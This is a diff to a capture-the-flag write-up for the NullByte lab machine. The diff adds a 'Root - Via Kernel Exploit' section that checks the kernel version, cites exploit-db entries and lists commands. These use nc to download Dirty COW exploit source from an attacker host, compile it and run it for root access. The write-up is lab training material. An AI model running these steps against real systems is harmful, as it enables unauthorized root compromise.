@@ -1,16 +1,3 @@
-# Table of contents
-
-- [Recon](#recon)
-  - [TCP/80 - HTTP](#tcp80---http)
-    - [FFUF](#ffuf)
-- [Initial Foothold](#initial-foothold)
-  - [TCP/80 - HTTP - Image Forensics + HTTP Form Bruteforce](#tcp80---http---image-forensics--http-form-bruteforce)
-  - [TCP/80 - HTTP - SQLi Database Enum w/ SQLMap](#tcp80---http---sqli-database-enum-w-sqlmap)
-  - [TCP/80 - HTTP - SQLi Database Enum Manual](#tcp80---http---sqli-database-enum-manual)
-  - [TCP/777 - SSH](#tcp777---ssh)
-- [Privilege Escalation](#privilege-escalation)
-  - [Root - Via SUID Binary (Path Hijacking)](#root---via-suid-binary-path-hijacking)
-
 # Recon
 ## TCP/80 - HTTP
 ### FFUF
@@ -90,6 +77,7 @@ uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
 	index.html              [Status: 200, Size: 113, Words: 6, Lines: 7]
 	:: Progress: [18460/18460] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
 	```
+	- `uploads` is a static html page, not a directory
 3. Tried some default creds on `phpmyadmin`, failed
 4. Only clue we have is the image, download the image
 	```
@@ -475,12 +463,27 @@ uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
 	Gms=
 	=PiAQ
 	-----END PGP PUBLIC KEY BLOCK-----
-
 	rootbash-4.3# 
 	```
-	
 
-
+## Root - Via Kernel Exploit
+1. Check system information
+	```
+	ramses@NullByte:~$ uname -a
+	Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
+	```
+	- `3.16.0-4-686`
+2. Search exploits for Linux `3.16.0-4-686`
+	- https://www.exploit-db.com/exploits/40616
+	- https://www.exploit-db.com/exploits/40839
+3. Exploit
+	```
+	ramses@NullByte:/tmp$ nc 192.168.110.4 4444 > 40839.c
+	ramses@NullByte:/tmp$ mv 40839.c dirty.c
+	ramses@NullByte:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
+	ramses@NullByte:/tmp$ chmod +x dirty; ./dirty 
+	```
+	![](images/Pasted%20image%2020220204011038.png)
 
 ---
 Tags: #image-forensic #exploit/sqli/database-enum #linux-priv-esc/suid/path-hijacking 
